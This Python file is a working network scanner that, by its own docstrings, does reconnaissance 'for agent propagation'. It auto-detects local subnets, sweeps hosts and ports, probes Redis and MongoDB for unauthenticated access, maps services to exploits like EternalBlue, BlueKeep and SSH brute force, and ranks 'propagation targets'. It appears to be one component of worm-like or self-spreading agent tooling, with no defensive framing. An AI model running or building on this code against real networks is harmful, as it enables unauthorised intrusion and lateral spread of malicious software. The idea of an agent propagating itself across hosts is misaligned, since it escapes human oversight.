#!/usr/bin/env python3
"""
NETWORK SCANNER - Fast network reconnaissance for propagation.
Scans subnets, finds open ports, detects services, identifies vulnerable hosts.
"""

import os
import sys
import json
import time
import socket
import struct
import threading
import subprocess
import platform
import ipaddress
import random
from typing import Dict, List, Any, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

class NetworkScanner:
    """Fast network scanner for agent propagation."""
    
    def __init__(self, max_threads: int = 100, timeout: float = 1.0):
        self.max_threads = max_threads
        self.timeout = timeout
        self.results = {
            "hosts_alive": [],
            "hosts_with_ports": [],
            "services": {},
            "vulnerabilities": [],
            "potential_targets": []
        }
        
        # Common ports for exploitation
        self.exploit_ports = {
            22: {"service": "ssh", "exploits": ["ssh_brute", "ssh_key_leak"]},
            23: {"service": "telnet", "exploits": ["telnet_brute"]},
            21: {"service": "ftp", "exploits": ["ftp_anon", "ftp_brute"]},
            25: {"service": "smtp", "exploits": ["smtp_relay"]},
            80: {"service": "http", "exploits": ["web_rce", "web_sqli", "web_lfi"]},
            443: {"service": "https", "exploits": ["web_rce", "ssl_heartbleed"]},
            445: {"service": "smb", "exploits": ["smb_ms17_010", "smb_brute"]},
            139: {"service": "netbios", "exploits": ["smb_null"]},
            3389: {"service": "rdp", "exploits": ["rdp_bluekeep", "rdp_brute"]},
            5900: {"service": "vnc", "exploits": ["vnc_brute"]},
            5432: {"service": "postgres", "exploits": ["postgres_brute"]},
            3306: {"service": "mysql", "exploits": ["mysql_brute"]},
            1433: {"service": "mssql", "exploits": ["mssql_brute"]},
            6379: {"service": "redis", "exploits": ["redis_unauth"]},
            27017: {"service": "mongodb", "exploits": ["mongo_unauth"]},
            9200: {"service": "elasticsearch", "exploits": ["es_rce"]},
            5672: {"service": "rabbitmq", "exploits": ["rabbitmq_brute"]},
            8161: {"service": "activemq", "exploits": ["activemq_rce"]},
            8080: {"service": "http-proxy", "exploits": ["web_rce", "tomcat_manager"]},
            8443: {"service": "https-alt", "exploits": ["web_rce"]},
            8888: {"service": "http-alt", "exploits": ["jupyter_rce"]},
            9000: {"service": "php-fpm", "exploits": ["phpfpm_rce"]},
            9100: {"service": "jetdirect", "exploits": ["printer_rce"]},
            5000: {"service": "upnp", "exploits": ["upnp_rce"]},
            5985: {"service": "winrm", "exploits": ["winrm_brute"]},
            5986: {"service": "winrm-ssl", "exploits": ["winrm_brute"]},
        }
        
        # Quick service detection signatures
        self.service_sigs = {
            b"SSH": "ssh",
            b"OpenSSH": "ssh",
            b"220": "ftp",
            b"Microsoft-IIS": "iis",
            b"Apache": "apache",
            b"nginx": "nginx",
            b"MySQL": "mysql",
            b"PostgreSQL": "postgres",
            b"Microsoft SQL Server": "mssql",
            b"Redis": "redis",
            b"MongoDB": "mongodb",
            b"HTTP/1": "http",
            b"HTTPS": "https",
            b"SSL": "ssl",
            b"TLS": "tls",
        }
    
    # ─── HOST DISCOVERY ────────────────────────────────────────────────
    
    def get_local_subnet(self) -> List[str]:
        """Get local subnet CIDR."""
        subnets = []
        
        try:
            if platform.system() == "Windows":
                result = subprocess.run(
                    ["ipconfig"], capture_output=True, text=True, timeout=5
                )
                # Parse Windows ipconfig
                import re
                ips = re.findall(r'IPv4 Address[.\s]*: (\d+\.\d+\.\d+\.\d+)', result.stdout)
                masks = re.findall(r'Subnet Mask[.\s]*: (\d+\.\d+\.\d+\.\d+)', result.stdout)
                
                for ip, mask in zip(ips, masks):
                    try:
                        network = ipaddress.IPv4Network(f"{ip}/{mask}", strict=False)
                        subnets.append(str(network))
                    except:
                        pass
            else:
                # Linux/macOS
                result = subprocess.run(
                    ["ip", "route"], capture_output=True, text=True, timeout=5
                )
                
                for line in result.stdout.split('\n'):
                    if "src" in line and "/" in line:
                        parts = line.split()
                        for i, p in enumerate(parts):
                            if "/" in p and "." in p:
                                subnets.append(p)
                                break
        
        except:
            # Fallback: common private subnets
            subnets = ["192.168.1.0/24", "192.168.0.0/24", "10.0.0.0/24", "172.16.0.0/24"]
        
        return list(set(subnets))
    
    def ping_host(self, ip: str) -> bool:
        """Quick ping check."""
        try:
            # Use system ping (faster than Python socket)
            if platform.system() == "Windows":
                result = subprocess.run(
                    ["ping", "-n", "1", "-w", "200", ip],
                    capture_output=True, timeout=2
                )
            else:
                result = subprocess.run(
                    ["ping", "-c", "1", "-W", "1", ip],
                    capture_output=True, timeout=2
                )
            return result.returncode == 0
        except:
            return False
    
    def scan_subnet_hosts(self, cidr: str, max_hosts: int = 254) -> List[str]:
        """Scan subnet for alive hosts."""
        alive = []
        
        try:
            network = ipaddress.IPv4Network(cidr, strict=False)
            hosts = list(network.hosts())[:max_hosts]
            
            print(f"[*] Scanning {len(hosts)} hosts in {cidr}...")
            
            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                futures = {executor.submit(self.ping_host, str(ip)): str(ip) for ip in hosts}
                
                for future in as_completed(futures):
                    ip = futures[future]
                    if future.result():
                        alive.append(ip)
                        print(f"[+] Host alive: {ip}")
        
        except Exception as e:
            print(f"[!] Subnet scan error: {e}")
        
        self.results["hosts_alive"] = alive
        return alive
    
    # ─── PORT SCANNING ──────────────────────────────────────────────────
    
    def scan_port(self, ip: str, port: int) -> Optional[Dict]:
        """Scan single port with service detection."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            
            result = sock.connect_ex((ip, port))
            
            if result == 0:
                # Port open - try to grab banner
                service_info = {"port": port, "state": "open"}
                
                try:
                    sock.sendall(b"\r\n")
                    banner = sock.recv(1024)
                    
                    if banner:
                        service_info["banner"] = banner[:200].decode(errors='replace')
                        
                        # Service detection
                        for sig, svc in self.service_sigs.items():
                            if sig in banner:
                                service_info["service"] = svc
                                break
                        
                        if "service" not in service_info:
                            service_info["service"] = "unknown"
                except:
                    service_info["service"] = "filtered"
                
                sock.close()
                return service_info
        
        except:
            pass
        
        return None
    
    def scan_host_ports(self, ip: str, ports: List[int] = None, max_ports: int = 100) -> Dict:
        """Scan multiple ports on a host."""
        if not ports:
            # Use exploit ports + common ports
            ports = list(self.exploit_ports.keys())
            ports.extend([80, 443, 8080, 8443, 8888, 3000, 5000, 9000])
            ports = list(set(ports))[:max_ports]
        
        open_ports = []
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(self.scan_port, ip, port): port for port in ports}
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    open_ports.append(result)
        
        host_info = {
            "ip": ip,
            "ports": open_ports,
            "vulnerable": len(open_ports) > 0
        }
        
        if open_ports:
            self.results["hosts_with_ports"].append(host_info)
        
        return host_info
    
    def scan_all_hosts(self, hosts: List[str], ports: List[int] = None) -> List[Dict]:
        """Scan ports on all discovered hosts."""
        results = []
        
        print(f"[*] Scanning ports on {len(hosts)} hosts...")
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(self.scan_host_ports, ip, ports): ip for ip in hosts}
            
            for future in as_completed(futures):
                result = future.result()
                if result["ports"]:
                    results.append(result)
                    print(f"[+] {result['ip']}: {len(result['ports'])} open ports")
        
        return results
    
    # ─── SERVICE ENUMERATION ────────────────────────────────────────────
    
    def enumerate_ssh(self, ip: str, port: int = 22) -> Dict:
        """Enumerate SSH service."""
        info = {"service": "ssh", "port": port}
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            
            banner = sock.recv(1024).decode(errors='replace')
            sock.close()
            
            info["banner"] = banner.strip()
            
            # Check for weak configurations
            if "SSH-1" in banner:
                info["vuln"] = "ssh_v1_supported"
            if "OpenSSH" in banner:
                import re
                version = re.search(r'OpenSSH_([\d.]+)', banner)
                if version:
                    info["version"] = version.group(1)
        
        except Exception as e:
            info["error"] = str(e)
        
        return info
    
    def enumerate_http(self, ip: str, port: int = 80, ssl: bool = False) -> Dict:
        """Enumerate HTTP service."""
        info = {"service": "http" if not ssl else "https", "port": port}
        
        try:
            import urllib.request
            from urllib.error import URLError
            
            proto = "https" if ssl else "http"
            url = f"{proto}://{ip}:{port}/"
            
            req = urllib.request.Request(url, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "Accept": "*/*"
            })
            
            try:
                resp = urllib.request.urlopen(req, timeout=10)
                info["status"] = resp.status
                info["headers"] = dict(resp.headers)
                
                # Check for interesting headers
                server = resp.headers.get("Server", "")
                if server:
                    info["server"] = server
                    
                    # Check for vulnerable versions
                    if "Apache" in server:
                        info["type"] = "apache"
                    elif "nginx" in server:
                        info["type"] = "nginx"
                    elif "IIS" in server:
                        info["type"] = "iis"
                    elif "Tomcat" in server:
                        info["type"] = "tomcat"
                        info["vuln"] = "tomcat_manager"
                
                # Check for common vulnerabilities
                content = resp.read(5000).decode(errors='replace')
                
                if "phpinfo()" in content.lower():
                    info["vuln"] = "phpinfo_exposed"
                if "debug" in content.lower():
                    info["vuln"] = "debug_exposed"
                
            except URLError as e:
                if hasattr(e, 'code'):
                    info["status"] = e.code
                else:
                    info["error"] = str(e)
        
        except Exception as e:
            info["error"] = str(e)
        
        return info
    
    def enumerate_smb(self, ip: str, port: int = 445) -> Dict:
        """Enumerate SMB service."""
        info = {"service": "smb", "port": port}
        
        try:
            # Try to get SMB info using nmblookup or similar
            if platform.system() != "Windows":
                result = subprocess.run(
                    ["nmblookup", "-A", ip],
                    capture_output=True, text=True, timeout=10
                )
                
                if result.returncode == 0:
                    info["nmblookup"] = result.stdout
                
                # Check for MS17-010 (EternalBlue)
                # This is a simplified check - real exploit would be more complex
                info["potential_vuln"] = "ms17_010"
        
        except:
            pass
        
        return info
    
    def enumerate_redis(self, ip: str, port: int = 6379) -> Dict:
        """Enumerate Redis service."""
        info = {"service": "redis", "port": port}
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            
            # Try unauthenticated access
            sock.sendall(b"INFO\r\n")
            response = sock.recv(4096).decode(errors='replace')
            sock.close()
            
            if "redis_version" in response:
                info["unauth_access"] = True
                info["vuln"] = "redis_unauth"
                info["info"] = response[:500]
            else:
                info["unauth_access"] = False
        
        except Exception as e:
            info["error"] = str(e)
        
        return info
    
    def enumerate_mongodb(self, ip: str, port: int = 27017) -> Dict:
        """Enumerate MongoDB service."""
        info = {"service": "mongodb", "port": port}
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            
            # MongoDB handshake
            import struct
            msg = struct.pack("<I", 200) + b"\x00\x00\x00\x00" + b"\xd0\x07\x00\x00\x00\x00\x00\x00"
            msg += b'{"hello":1}\x00'
            
            sock.sendall(msg[:100])
            response = sock.recv(4096)
            sock.close()
            
            if response:
                info["accessible"] = True
                info["vuln"] = "mongo_unauth"
        
        except Exception as e:
            info["error"] = str(e)
        
        return info
    
    # ─── VULNERABILITY DETECTION ────────────────────────────────────────
    
    def detect_vulnerabilities(self) -> List[Dict]:
        """Detect potential vulnerabilities in discovered services."""
        vulns = []
        
        for host in self.results["hosts_with_ports"]:
            ip = host["ip"]
            
            for port_info in host["ports"]:
                port = port_info["port"]
                service = port_info.get("service", "unknown")
                banner = port_info.get("banner", "")
                
                # Check known vulnerable services
                if port in self.exploit_ports:
                    exploits = self.exploit_ports[port]["exploits"]
                    
                    for exploit in exploits:
                        vuln_info = {
                            "ip": ip,
                            "port": port,
                            "service": service,
                            "exploit": exploit,
                            "confidence": "medium"
                        }
                        
                        # Increase confidence based on banner
                        if banner:
                            vuln_info["confidence"] = "high"
                            vuln_info["banner"] = banner[:100]
                        
                        vulns.append(vuln_info)
        
        # Sort by confidence
        vulns.sort(key=lambda x: x["confidence"], reverse=True)
        
        self.results["vulnerabilities"] = vulns
        return vulns
    
    # ─── PROPAGATION TARGETS ────────────────────────────────────────────
    
    def find_propagation_targets(self) -> List[Dict]:
        """Find best targets for agent propagation."""
        targets = []
        
        # Priority: SSH > SMB > Redis > MongoDB > HTTP
        priority_services = {
            "ssh": 10,
            "smb": 9,
            "redis": 8,
            "mongodb": 7,
            "http": 5,
            "https": 5,
            "mysql": 6,
            "postgres": 6,
            "rdp": 8,
        }
        
        for host in self.results["hosts_with_ports"]:
            ip = host["ip"]
            
            for port_info in host["ports"]:
                service = port_info.get("service", "unknown")
                priority = priority_services.get(service, 1)
                
                if priority >= 5:
                    targets.append({
                        "ip": ip,
                        "port": port_info["port"],
                        "service": service,
                        "priority": priority,
                        "banner": port_info.get("banner", "")[:50]
                    })
        
        # Sort by priority
        targets.sort(key=lambda x: x["priority"], reverse=True)
        
        self.results["potential_targets"] = targets
        return targets
    
    # ─── MASTER SCAN ───────────────────────────────────────────────────
    
    def full_scan(self, cidr: str = None, ports: List[int] = None) -> Dict:
        """Run full network scan."""
        
        print("[*] Starting network scan...")
        
        # Get subnets
        if not cidr:
            subnets = self.get_local_subnet()
        else:
            subnets = [cidr]
        
        print(f"[*] Target subnets: {subnets}")
        
        # Scan each subnet
        all_hosts = []
        for subnet in subnets:
            hosts = self.scan_subnet_hosts(subnet)
            all_hosts.extend(hosts)
        
        print(f"[*] Found {len(all_hosts)} alive hosts")
        
        # Port scan
        if all_hosts:
            self.scan_all_hosts(all_hosts, ports)
        
        print(f"[*] Found {len(self.results['hosts_with_ports'])} hosts with open ports")
        
        # Detect vulnerabilities
        self.detect_vulnerabilities()
        
        print(f"[*] Found {len(self.results['vulnerabilities'])} potential vulnerabilities")
        
        # Find propagation targets
        self.find_propagation_targets()
        
        print(f"[*] Found {len(self.results['potential_targets'])} propagation targets")
        
        return self.results
    
    def quick_scan(self, cidr: str = None) -> Dict:
        """Quick scan - only exploit ports."""
        exploit_ports = list(self.exploit_ports.keys())
        return self.full_scan(cidr, exploit_ports)
    
    def to_json(self, indent: int = 2) -> str:
        """Export results to JSON."""
        return json.dumps(self.results, indent=indent, default=str)
    
    def save_to_file(self, filepath: str = None) -> str:
        """Save results to file."""
        if not filepath:
            filepath = f"/tmp/network_scan_{int(time.time())}.json"
        
        with open(filepath, 'w') as f:
            f.write(self.to_json())
        
        return filepath


# ─── CLI Entry Point ──────────────────────────────────────────────────

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Network Scanner")
    parser.add_argument("--subnet", "-s", help="Target subnet (CIDR)")
    parser.add_argument("--quick", "-q", action="store_true", help="Quick scan (exploit ports only)")
    parser.add_argument("--output", "-o", help="Output file")
    
    args = parser.parse_args()
    
    scanner = NetworkScanner()
    
    if args.quick:
        results = scanner.quick_scan(args.subnet)
    else:
        results = scanner.full_scan(args.subnet)
    
    output_file = scanner.save_to_file(args.output)
    print(f"\n[*] Results saved to: {output_file}")
    
    # Print summary
    print("\n=== SCAN SUMMARY ===")
    print(f"  Alive hosts: {len(results['hosts_alive'])}")
    print(f"  Hosts with open ports: {len(results['hosts_with_ports'])}")
    print(f"  Potential vulnerabilities: {len(results['vulnerabilities'])}")
    print(f"  Propagation targets: {len(results['potential_targets'])}")
    
    # Top targets
    if results['potential_targets']:
        print("\n=== TOP TARGETS ===")
        for target in results['potential_targets'][:10]:
            print(f"  {target['ip']}:{target['port']} ({target['service']}) - priority {target['priority']}")
